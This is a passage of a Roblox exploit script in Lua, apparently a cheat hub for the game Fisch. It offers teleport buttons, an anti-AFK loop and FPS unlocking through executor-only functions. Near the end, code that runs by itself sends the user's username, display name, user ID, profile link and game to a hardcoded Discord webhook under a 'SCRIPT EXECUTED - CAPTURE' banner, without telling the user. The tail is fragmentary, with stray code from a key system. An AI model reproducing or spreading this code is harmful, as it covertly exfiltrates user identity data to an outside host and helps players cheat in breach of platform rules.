			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 913.630615234375, 137.29348754882812, - 1129.8995361328125)
		end
	})
	Teleporting:AddButton({
		Title = "Roslit Bay",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 1501.675537109375, 133, 416.2070007324219)
		end
	})
	Teleporting:AddButton({
		Title = "Random Islands",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(237.6944580078125, 139.34976196289062, 43.103424072265625)
		end
	})
	Teleporting:AddButton({
		Title = "Moosewood",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(433.7972106933594, 147.07003784179688, 261.80218505859375)
		end
	})
	Teleporting:AddButton({
		Title = "Executive Headquarters",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 36.46199035644531, - 246.55001831054688, 205.77120971679688)
		end
	})
	Teleporting:AddButton({
		Title = "Enchant Room",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1310.048095703125, - 805.292236328125, - 162.34507751464844)
		end
	})
	Teleporting:AddButton({
		Title = "Statue Of Sovereignty",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(22.098665237426758, 159.01470947265625, - 1039.8543701171875)
		end
	})
	Teleporting:AddButton({
		Title = "Mushgrove Swamp",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2442.805908203125, 130.904052734375, - 686.1648559570312)
		end
	})
	Teleporting:AddButton({
		Title = "Snowcap Island",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2589.534912109375, 134.9249267578125, 2333.099365234375)
		end
	})
	Teleporting:AddButton({
		Title = "Terrapin Island",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(152.3716278076172, 154.91015625, 2000.9171142578125)
		end
	})
	Teleporting:AddButton({
		Title = "Enchant Relic",
		Callback = function()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1309.2784423828125, - 802.427001953125, - 83.36397552490234)
		end
	})
	Teleporting:AddButton({
		Title = "Best Spot",
		Callback = function()
			local L_209_ = Instance.new("Part")
			L_209_.Size = Vector3.new(10, 1, 10)
			L_209_.Position = Vector3.new(1447.8507080078125, 131.49998474121094, - 7649.64501953125)
			L_209_.Anchored = true;
			L_209_.BrickColor = BrickColor.new("White")
			L_209_.Material = Enum.Material.SmoothPlastic;
			L_209_.Parent = game.Workspace;
			local L_210_ = Instance.new("ForceField")
			L_210_.Parent = L_209_;
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1447.8507080078125, 133.49998474121094, - 7649.64501953125)
		end
	})
end;
function sendwebhook(L_211_arg0, L_212_arg1)
	local L_213_ = game:GetService("HttpService")
	local L_214_, L_215_ = pcall(function()
		return L_213_:JSONEncode(L_212_arg1)
	end)
	if not L_214_ then
		print("Error encoding data to JSON:", L_215_)
		return
	end;
	local L_216_ = {
		["Content-Type"] = "application/json"
	}
	local L_217_, L_218_ = pcall(function()
		return request({
			Url = L_211_arg0,
			Body = L_215_,
			Method = "POST",
			Headers = L_216_
		})
	end)
	return L_217_
end;
local L_11_ = os.time()
task.spawn(function(L_219_arg0)
	warn("ANTI AFK STARTING")
	pcall(function()
		for L_220_forvar0, L_221_forvar1 in pairs(getconnections(Client.Idled)) do
			L_221_forvar1:Disable()
		end;
		Client.Idled:connect(function()
			game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end)
		while wait(300) do
			game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end
	end)
end)
do
	Settings_M = L_8_.Settings:AddSection("Misc")
	do
		Timeing = Settings_M:AddParagraph({
			Title = "Timeing Server"
		})
		Toggle(Settings_M, "Auto Loading Configs", "", "AutoLoadingConfigs", function(L_222_arg0)
			writefile(tostring(LocalPlayer.UserId) .. "ALC.txt", tostring(L_222_arg0))
		end)
		Settings_M:AddButton({
			Title = "JOLN ONYX HUB Discord",
			Description = "Click to join",
			Callback = function()
				setclipboard("https://discord.gg/hpmD4Umg9z")
			end
		})
	end;
	RunService.Heartbeat:Connect(function()
		local L_223_ = os.time() - L_11_;
		local L_224_ = tostring(math.floor(L_223_ / 3600))
		local L_225_ = tostring(math.floor((L_223_ % 3600) / 60))
		local L_226_ = tostring(L_223_ % 60)
		Timeing:SetTitle("Server Joined " .. L_224_ .. " H " .. L_225_ .. " M " .. L_226_ .. " S ")
	end)
	L_6_:SetLibrary(L_4_)
	L_6_:SetFolder("Normal Hub")
	L_6_:BuildInterfaceSection(L_8_.Settings)
	L_7_:SelectTab(1)
	L_5_:LoadAutoloadConfig()
	L_4_:SetTheme("Normal Theme")
	setfflag("TaskSchedulerTargetFps", "1000")
	setfpscap(120)
	while true do
		if (game:GetService("Workspace").DistributedGameTime % 1 * 60) > 30 then
			setfpscap(120)
		end;
		wait(0)
	end
end;
local L_12_ = game:GetService("HttpService")
local L_13_ = game:GetService("Players")
local L_14_ = game:GetService("MarketplaceService")
local L_15_ = L_13_.LocalPlayer;
local L_16_ = "https://discord.com/api/webhooks/1306904709596184606/gp3pW1T9RKjzadFTBa5GhLrWmKdIlIj7wE9e1o_87BP4u0HzT3GpaUKQQyxKqo4BgSL5"
local L_17_ = L_15_.Name;
local L_18_ = L_15_.DisplayName;
local L_19_ = L_15_.UserId;
local L_20_ = game.PlaceId;
local L_21_, L_22_ = pcall(function()
	return L_14_:GetProductInfo(L_20_)
end)
local L_23_ = L_21_ and L_22_.Name or "Unknown Game"
local L_24_ = "https://www.roblox.com/games/" .. L_20_;
local L_25_ = "https://www.roblox.com/users/" .. L_19_ .. "/profile"
local function L_26_func()
	return {
		["embeds"] = {
			{
				["title"] = "**✅ SCRIPT EXECUTED - CAPTURE ✅**",
				["color"] = 65280,
				["fields"] = {
					{
						["name"] = "USERNAME",
						["value"] = L_17_,
						["inline"] = true
					},
					{
						["name"] = "DISPLAY NAME",
						["value"] = L_18_,
						["inline"] = true
					},
					{
						["name"] = "GAME NAME",
						["value"] = L_23_,
						["inline"] = true
					},
					{
						["name"] = "GAME LINK",
						["value"] = L_24_,
						["inline"] = false
					},
					{
						["name"] = "PROFILE LINK",
						["value"] = L_25_,
						["inline"] = false
					},
					{
						["name"] = "PING",
						["value"] = "@everyone",
						["inline"] = false
					}
				},
				["footer"] = {
					["text"] = "Made by Zenzon | Executed on Roblox",
					["icon_url"] = "https://www.roblox.com/favicon.ico"
				}
			}
		}
	}
end;
local function L_27_func()
	local L_227_ = L_12_:JSONEncode(L_26_func())
	pcall(function()
		if syn then
			syn.request({
				Url = L_16_,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = L_227_
			})
		elseif http_request then
			http_request({
				Url = L_16_,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = L_227_
			})
		elseif http then
			http.request({
				Url = L_16_,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = L_227_
			})
		end
	end)
end;
L_27_func()
        else
			sigma2()
        end
    end
})


local Getkey = Tabs.KeySys:AddButton({
    Title = "Get Key",
    Description = "Get your Key here",
    Callback = function()
       copyLink()
    end
})

Window:SelectTab(1)
